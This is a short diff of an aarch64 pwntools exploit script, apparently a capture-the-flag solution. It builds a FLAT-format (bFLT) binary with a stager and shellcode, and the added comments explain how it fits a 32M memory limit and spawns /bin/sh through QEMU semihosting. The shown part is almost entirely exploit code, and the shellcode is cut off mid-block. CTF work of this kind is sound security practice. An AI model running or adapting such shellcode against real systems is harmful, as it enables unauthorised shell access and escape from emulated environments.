@@ -3,9 +3,18 @@ from pwn import *
 context.update(arch='aarch64', os='linux')
 context.log_level = 'debug'
 
+# spend a couple of hours messing with elf from tmpout
+# and came to conclusion that its impossible to adapt it
+# so quick look at qemu source revealed presence of
+# FLAT file format
+
 sc =  b'bFLT'
 sc += b'\x00\x00\x00\x00\x00\x00\x00\x04'
 sc += b'\x00\x00\x00\x00\x00\x00\x00\x14'
+
+# `mov x0, #0` used instuction encoded using two zero
+# bytes in front and used here as a nop for setting 
+# size of data and bss segment as remote have 32M memory limit
 
 stager = asm("""
         add x1, sp,#0x100
@@ -25,6 +34,7 @@ pad = b'\x00\x00\x00\x00'
 
 sc += pad*(11-(len(stager)>>2))
 
+# call /bin/sh using semihosting
 shellcode = asm("""
   mov x2, 0x7
   str x2, [sp, #(8 * 1)]
